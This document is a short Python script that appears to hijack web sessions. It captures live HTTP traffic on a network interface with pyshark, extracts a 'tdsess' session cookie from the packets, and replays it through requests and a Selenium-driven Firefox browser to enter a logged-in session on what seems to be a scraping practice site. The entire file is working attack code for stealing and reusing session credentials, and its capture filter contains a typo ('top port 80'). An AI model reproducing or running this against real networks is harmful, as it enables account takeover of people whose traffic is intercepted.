import re

import pyshark
import requests
from requests import cookies

cap = pyshark.LiveCapture(interface='enp2s0', bpf_filter='top port 80')
cap.sniff(packet_count=10)

url = "http://testing-ground.scraping.pro/login?mode=welcome"


def print_dns_info(pkt):
    session = re.search(".*tdsess=(\S+).*", str(pkt))
    if session and "deleted" not in session.group(1):
        cookie = dict(tdsess=session.group(1)[:-4])

        print("Got the session id...", cookie)

        request = requests.Session()
        resp = request.get(url, cookies=cookie)
        content = resp.content
        message = re.search("<h3.*</h3>", str(content))
        if message:
            print(message.group(0))

        import selenium.webdriver
        driver = selenium.webdriver.Firefox()
        driver.get("http://testing-ground.scraping.pro/login?mode=welcome")
        driver.add_cookie({'name': 'tdsess', 'value': session.group(1)[:-4]})
        driver.get("http://testing-ground.scraping.pro/login?mode=welcome")
        exit(1)


cap.apply_on_packets(print_dns_info, timeout=100)
